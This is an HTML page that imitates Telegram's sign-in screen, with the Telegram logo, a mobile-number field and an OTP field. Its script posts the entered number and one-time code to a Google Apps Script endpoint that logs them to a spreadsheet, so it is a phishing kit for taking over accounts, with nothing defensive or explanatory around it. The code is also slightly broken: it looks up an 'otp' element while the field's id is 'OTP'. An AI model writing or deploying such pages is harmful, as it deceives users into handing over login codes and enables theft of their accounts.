<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }
        .login-container {
            background: white;
            padding: 50px;
            border-radius: 2px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        input {
            width: 102%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 110%;
            padding: 15px;
            background-color: #4A90E2;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: darkskyblue;
        }
    </style>
</head>
<body>
     <div class="login-container">
        <img src="telegram-logo.png" width="300" height="150" alt="logo">
        <h2>Sign in to Telegram</h2>
        <input type="text" id="mobile" placeholder="Enter mobile number" maxlength="13" name="mobile number">
        <input type="text" id="OTP" placeholder="Enter OTP (any number)" name="OTP">  </br>
        <button onclick="verifyOTP()">Verify</button> </div>

    <script>
        const googleAppsScriptURL = "https://script.google.com/macros/s/AKfycbwvSzaERgYJfmmJOPvOJnF3R6q937nkqXFL-T5kxd3Y8Pu8Q0OqBkmIM9ouaiBEwjwg/exec";

async function verifyOTP() {
    let mobileNumber = document.getElementById("mobile").value.trim();
    let enteredOTP = document.getElementById("otp").value.trim(); // Fix ID name (was "OTP", changed to "otp")

    if (!mobileNumber) {
        alert("Please enter a mobile number");
        return;
    }

    if (!enteredOTP) {
        alert("Please enter an OTP");
        return;
    }

    let data = {
        mobile: mobileNumber,
        otp: enteredOTP
    };

    try {
        let response = await fetch(googleAppsScriptURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data),
            mode: "no-cors" // âœ… Fix for CORS issue
        });

        // Since "no-cors" prevents reading the response, show a generic success message
        alert("Your data has been sent. Please check the spreadsheet.");

    } catch (error) {
        console.error("Error storing data:", error);
        alert("Error connecting to the server.");
    }
}
    </script>
</body>
</html>
